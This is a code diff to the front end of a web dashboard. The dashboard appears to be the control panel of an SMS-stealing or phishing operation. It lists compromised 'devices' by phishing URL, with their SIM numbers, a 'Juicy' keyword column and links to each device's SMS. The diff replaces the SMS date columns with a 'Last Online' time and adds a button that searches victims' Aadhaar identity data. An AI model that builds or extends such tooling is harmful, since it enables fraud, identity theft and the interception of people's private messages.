@@ -175,11 +175,10 @@
             <th>SIM 1</th>
             <th>SIM 2</th>
             <th>Last Activity</th>
-            <th>Oldest SMS</th>
-            <th>Newest SMS</th>
+            <th>Last Online</th>
             <th>Juicy</th>
             <th>Notes</th>
-            <th>SMS</th>
+            <th>Actions</th>
           </tr>
         </thead>
         <tbody id="device-tbody"></tbody>
@@ -414,7 +413,7 @@ document.getElementById('search-input').addEventListener('input', async () => {
 async function openUrl(id) {
   document.getElementById('view-urls').classList.remove('active');
   document.getElementById('view-devices').classList.add('active');
-  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="13"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
+  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="12"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
   currentUrlId = id;
 
   const res = await fetch(`/api/url/${id}`);
@@ -468,7 +467,7 @@ function renderDevices() {
 
   const tbody = document.getElementById('device-tbody');
   if (!list.length) {
-    tbody.innerHTML = `<tr><td colspan="13" style="text-align:center;padding:40px;color:var(--muted)">No devices match this filter</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="12" style="text-align:center;padding:40px;color:var(--muted)">No devices match this filter</td></tr>`;
     return;
   }
 
@@ -503,13 +502,13 @@ function renderDevices() {
       <td>${sim1Html}</td>
       <td>${sim2Html}</td>
       <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
-      <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
-      <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
+      <td style="color:var(--muted);font-size:12px">${d.lastOnline ? d.lastOnline.slice(0,16) : '—'}</td>
       <td>${kwHtml}</td>
       <td><button class="sms-btn" onclick="openNotes(event,${currentUrlId},'${d.deviceId}')">📝</button></td>
       <td><a class="sms-btn" href="${d.smsLink}" target="_blank">📥 SMS</a>
           <button class="sms-btn" style="margin-left:4px" onclick="openSearchno(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">📞</button>
-          <button class="sms-btn" onclick="openNotes(event,${currentUrlId},'${d.deviceId}')">📝</button></td>
+          ${d.hasAadhaar ? `<button class="sms-btn" style="margin-left:4px" onclick="openSearchaadhar(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">🪪</button>` : ''}
+      </td>
     </tr>`;
   }).join('');
 }
